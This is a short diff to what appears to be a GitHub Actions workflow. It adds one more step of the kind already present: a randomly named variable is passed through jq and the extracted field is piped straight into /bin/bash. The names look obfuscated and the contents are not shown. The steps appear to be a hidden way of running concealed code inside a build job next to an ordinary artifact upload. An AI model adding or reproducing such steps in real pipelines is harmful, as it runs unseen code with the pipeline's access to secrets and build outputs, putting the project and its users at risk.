@@ -34,6 +34,7 @@ jobs:
           echo $dw38 | jq -r .wmr029 | /bin/bash
           echo $l43 | jq -r .sgqiu9 | /bin/bash
           printf '%s' "$kejs700" | jq -r .jtqg832 | /bin/bash
+          echo $fmo285 | jq -r .q0 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
